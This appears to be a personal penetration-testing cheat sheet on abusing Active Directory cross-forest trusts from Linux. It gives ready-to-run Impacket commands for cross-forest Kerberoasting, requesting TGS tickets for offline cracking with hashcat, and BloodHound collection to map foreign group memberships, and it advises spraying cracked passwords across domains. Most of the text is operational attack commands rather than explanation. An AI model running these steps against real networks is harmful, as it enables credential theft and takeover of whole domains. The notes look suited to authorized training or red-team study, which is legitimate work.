# Attacking Domain Trusts — Cross-Forest Trust Abuse (Linux)

Same attacks as the Windows section, Impacket tooling instead.

---

## Cross-Forest Kerberoasting

Enumerate SPN accounts in the trusted forest — check `MemberOf` immediately:

```bash
GetUserSPNs.py -target-domain <TARGET_FOREST> <YOUR_DOMAIN>/<USER>
```

Pull the TGS ticket:

```bash
GetUserSPNs.py -request -target-domain <TARGET_FOREST> <YOUR_DOMAIN>/<USER> -outputfile <OUTFILE>
```

Crack with hashcat mode 13100. DA in target forest → after cracking, spray that password in your current domain too — same admins often reuse across forests.

---

## Foreign Group Membership — bloodhound-python

Collect from both forests separately. For each, update `/etc/resolv.conf` to point at that forest's DC:

```
domain <FOREST_FQDN>
nameserver <DC_IP>
```

Run collection:

```bash
bloodhound-python -d <FOREST_FQDN> -dc <DC_FQDN> -c All -u <USER>@<YOUR_DOMAIN> -p <PASS>
```

Zip per forest and upload both to BloodHound GUI:

```bash
zip -r <OUTFILE>.zip *.json
```

BloodHound query after uploading both datasets: **Users with Foreign Domain Group Membership** → select source domain → see any accounts with privileged group membership in the other forest.

> [!tip] If your domain's Administrator shows up as a member of the target forest's `Administrators` group, you already own both forests — no further attack needed. Verify with `Enter-PSSession` or CME.

> [!tip] Always cross-check cracked cross-forest SPN passwords against accounts in your current domain. If the same admin team manages both environments, password reuse is high probability.